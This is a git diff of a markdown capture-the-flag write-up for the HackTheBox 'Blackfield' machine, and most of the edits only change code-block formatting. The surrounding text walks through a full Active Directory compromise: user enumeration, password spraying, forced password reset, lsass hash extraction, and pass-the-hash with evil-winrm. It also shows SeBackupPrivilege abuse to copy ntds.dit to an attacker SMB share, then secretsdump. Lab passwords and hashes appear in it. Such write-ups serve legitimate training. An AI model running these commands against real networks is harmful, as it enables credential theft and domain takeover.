@@ -214,70 +214,79 @@ rpcclient $> enumdomusers
 ```
 
 Clean list of users we got from RCP
-```
+
+```bash
 cat rpc_users.lst.tmp | awk -F\[ '{print $2}' | awk -F\] '{print $1}' | sort -u > rpc_users.lst
 ```
 
 Run again kerbrute with new list of users
-```
+
+```bash
 ~/Downloads/kerbrute_linux_amd64 userenum --dc 10.10.10.192 -d blackfield -o kerbrute.rpc.userenum.out rpc_users.lst
 ```
 
 create a file with the valid user list
-```
+
+```bash
 $ cat kerbrute.rpc.userenum.out | grep 'VALID USERNAME' | awk '{print $7}' | awk -F@ '{print $1}' > valid_rpc_users.lst
 ```
 
 Running GetNPUsers to perform an ASREP Roast
-```
+
+```bash
 $ ~/impacket/examples/GetNPUsers.py -dc-ip 10.10.10.192 -no-pass -usersfile valid_rpc_users.lst blackfield/
 ```
+
 No new hashes.
 
-
 Passwordspray valid users with password of `support` user
-```
+
+```bash
 ~/Downloads/kerbrute_linux_amd64 passwordspray --dc 10.10.10.192 -d blackfield valid_rpc_users.lst '#00^BlackKnight'
 ```
 
 This does not work as our local clock is too far from the domain one. However update the clock didn't work
-```
+
+```bash
 $ sudo ntpdate 10.10.10.192
 ntpdig: no eligible servers
 ```
 
 Let's get more data using bloodhound
-```
+
+```bash
 mkdir bloodhound
 cd bloodbound
 $ bloodhound-python -ns 10.10.10.192 -d blackfield.local -u support -p '#00^BlackKnight' -c all 
 ```
 
 Then we start bloodhound database (neo4j) and bloodhound
-```
+
+```bash
 sudo neo4j console
 ```
-```
+
+```bash
 bloodhound
 ```
 
 Investigating the details we got, we found out that the user `support` user can change the password of the `audit2020` user.
 
-![](images/bloodhound_support_01.png)
-![](images/bloodhound_support_02.png)
-
+![bloodhound](images/bloodhound_support_01.png)
+![bloodhound](images/bloodhound_support_02.png)
 
 We can perform this opearion using RPC.
-```
+
+```bash
 $ rpcclient dc01.BLACKFIELD.local -U support 
 Password for [WORKGROUP\support]:#00^BlackKnight
 
 rpcclient $> setuserinfo2 Audit2020 23 'P@ssw0rd!'
-
 ```
 
 Now if we try to list shares from the DC with the `Audit2020` user we see that we have READ access to `forensic` share.
-```
+
+```bash
 $ crackmapexec smb 10.10.10.192 -u 'audit2020' -p 'P@ssw0rd!' --shares                           
 
 SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
@@ -298,11 +307,10 @@ It worked. Now we have one more credential.
 
 | username | password |
 | --- | --- |
-| support | #00^BlackKnight | 
+| support | #00^BlackKnight |
 | audit2020 | P@ssw0rd! |
 
-
-```
+```bash
 $ smbclient '//10.10.10.192/forensic' -U 'Audit2020'
 Password for [WORKGROUP\Audit2020]: P@ssw0rd!
 Try "help" to get a list of possible commands.
@@ -316,7 +324,7 @@ smb: \> ls
                 5102079 blocks of size 4096. 1674475 blocks available
 ```
 
-```
+```bash
 $ mkdir smb
 cd smb 
 
@@ -332,7 +340,8 @@ $ sudo umount /mnt/htb
 ```
 
 With the lsass dump file, we can run pypykatz to try to extract the secrets from the file.
-```
+
+```bash
 $ pypykatz lsa minidump --grep lsass.DMP | grep -i -e ':BLACKFIELD:'
 ...
 msv:BLACKFIELD:svc_backup:9658d1d1dcd9250115e2205d9f48400d::463c13a9a31fc3252c68ba0a44f0221626a33e5c::::
@@ -341,19 +350,23 @@ msv:BLACKFIELD:Administrator:7f1e4ff8c6a8e6b6fcae2d9c0572cd62::db5c89a961644f097
 ```
 
 We can use crakmapexec to test if the hashes are valid.
-```
+
+```bash
 $ crackmapexec smb 10.10.10.192 -u 'administrator' -H 7f1e4ff8c6a8e6b6fcae2d9c0572cd62
 
 SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
 SMB         10.10.10.192    445    DC01             [-] BLACKFIELD.local\administrator:7f1e4ff8c6a8e6b6fcae2d9c0572cd62 STATUS_LOGON_FAILURE
 ```
+
 `Administrator` credentials seems to be invalid.
-```
+
+```bash
 $ crackmapexec smb 10.10.10.192 -u 'svc_backup' -H 9658d1d1dcd9250115e2205d9f48400d   
 
 SMB         10.10.10.192    445    DC01             [*] Windows 10.0 Build 17763 x64 (name:DC01) (domain:BLACKFIELD.local) (signing:True) (SMBv1:False)
 SMB         10.10.10.192    445    DC01             [+] BLACKFIELD.local\svc_backup:9658d1d1dcd9250115e2205d9f48400d 
 ```
+
 `svc_backup` works.
 
 We can add this credential to our collection.
@@ -365,7 +378,8 @@ We can add this credential to our collection.
 | svc_backup | --- | 9658d1d1dcd9250115e2205d9f48400d |
 
 If we test WinRM we get access.
-```
+
+```bash
 $ crackmapexec winrm 10.10.10.192 -u 'svc_backup' -H 9658d1d1dcd9250115e2205d9f48400d 
 
 SMB         10.10.10.192    5985   DC01             [*] Windows 10.0 Build 17763 (name:DC01) (domain:BLACKFIELD.local)
@@ -374,7 +388,8 @@ WINRM       10.10.10.192    5985   DC01             [+] BLACKFIELD.local\svc_bac
 ```
 
 Lets use `Evil-WinRM` to access the machine.
-```
+
+```bash
 $ evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
 
 ...
@@ -387,8 +402,10 @@ blackfield\svc_backup
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> cat ..\Desktop\user.txt
 3920bb317a0b**********
 ```
+
 Checking `whoami /all` we can see some interesting privileges.
-```
+
+```bash
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> whoami /all
 
 USER INFORMATION
@@ -442,12 +459,13 @@ The privilege `SeBackupPrivilege` and `SeBackupPrivilege` are interesting ones. 
 Users with these privileges can create backups of sensitive data of the AD and restore them. We can use it to copy critical files of the system to extract users hashes. 
 
 We need to get 2 items:
+
 - ntds
 - SYSTEM
 
 Becasue the `ntds` file is in use, we need to backup and restore it on a different folder to be able to copy it.
 
-```
+```bash
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> mkdir C:\Temp
 *Evil-WinRM* PS C:\Users\svc_backup\Documents> cd C:\Temp
 *Evil-WinRM* PS C:\Temp> 
@@ -455,7 +473,7 @@ Becasue the `ntds` file is in use, we need to backup and restore it on a differe
 
 To generate the backup and restore it later, lets use the `wbadmin` tool on Windows.
 
-```
+```bash
 *Evil-WinRM* PS C:\Temp> wbadmin start backup -quiet -backuptarget:\\DC01\C$\Temp -include:C:\Windows\ntds
 wbadmin 1.0 - Backup command-line tool
 (C) Copyright Microsoft Corporation. All rights reserved.
@@ -496,7 +514,7 @@ Note that we had to specify the network share `\\DC01\C$\Temp` for the backup de
 
 Now let list all the backup versions (restauration points) present on the machine.
 
-```
+```bash
 *Evil-WinRM* PS C:\Temp> wbadmin get versions
 wbadmin 1.0 - Backup command-line tool
 (C) Copyright Microsoft Corporation. All rights reserved.
@@ -514,7 +532,7 @@ Can recover: Volume(s), File(s)
 
 The second one on the list is the one we have just genereated. This is the one we need to use to restore the file.
 
-```
+```bash
 *Evil-WinRM* PS C:\Temp> mkdir Restore
 
 *Evil-WinRM* PS C:\Temp> wbadmin start recovery -quiet -version:10/03/2022-21:21 -itemtype:file -items:C:\Windows\ntds\ntds.dit -recoverytarget:C:\Temp\Restore -notrestoreacl
@@ -552,13 +570,14 @@ Mode                LastWriteTime         Length Name
 
 Now lets generate a copy of the SYSTEM registry hive on the same folder.
 
-```
+```bash
 *Evil-WinRM* PS C:\Temp> reg save hklm\system C:\Temp\Restore\system.hive
 The operation completed successfully.
 ```
 
 Now we have all the files we need.
-```
+
+```bash
 *Evil-WinRM* PS C:\Temp> cd Restore
 *Evil-WinRM* PS C:\Temp\Restore> dir
 
@@ -573,7 +592,8 @@ Mode                LastWriteTime         Length Name
 ```
 
 On Kali, lets create a folder and start an SMB server to receive the files.
-```
+
+```bash
 $ mkdir backupPriv
 $ cd backupPriv
 $ impacket-smbserver share $(pwd) -smb2support
@@ -581,7 +601,7 @@ $ impacket-smbserver share $(pwd) -smb2support
 
 Back on the target, lets access the share and copy the files over there.
 
-```
+```bash
 *Evil-WinRM* PS C:\Temp\Restore> net use \\10.10.14.4\share
 The command completed successfully.
 
@@ -600,7 +620,7 @@ Mode                LastWriteTime         Length Name
 
 With the restored files at hand we can use `secretsdump.py` to list all the domain credentials.
 
-```
+```bash
 $ /usr/share/doc/python3-impacket/examples/secretsdump.py -system system.hive -ntds ntds.dit LOCAL > credentials.txt
 
 $ cat credentials.txt | grep -i -e 'admin'
@@ -612,16 +632,16 @@ Administrator:des-cbc-md5:5d25a84ac8c229c1
 
 Lets test the `administrator` hash. 
 
-```
+```bash
 $ evil-winrm -i 10.10.10.192 -u administrator -H 184fb5e5178480be64824d4cd53b99ee
 ...
 *Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
 blackfield\administrator
 ```
 
-It works :-) <br/>
+It works :-)
 
-Now we can add the administrator account on our list of credentials.
+Now we can add the `administrator` account on our list of credentials.
 
 | username | password | hash |
 | --- | --- | --- |
@@ -632,7 +652,7 @@ Now we can add the administrator account on our list of credentials.
 
 Before we get the root flag, we have one more obstacle.
 
-```
+```bash
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> cat notes.txt
 Mates,
 
@@ -650,7 +670,7 @@ PS: Because the audit report is sensitive, I have encrypted it on the desktop (r
 
 It looks like `root.txt` is encrypted.
 
-```
+```bash
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> cipher /c root.txt
 
  Listing C:\Users\Administrator\Desktop\
@@ -659,9 +679,7 @@ It looks like `root.txt` is encrypted.
 U root.txt
 ```
 
-
-
-```
+```bash
 *Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
 4375a629c7c6**********
 ```
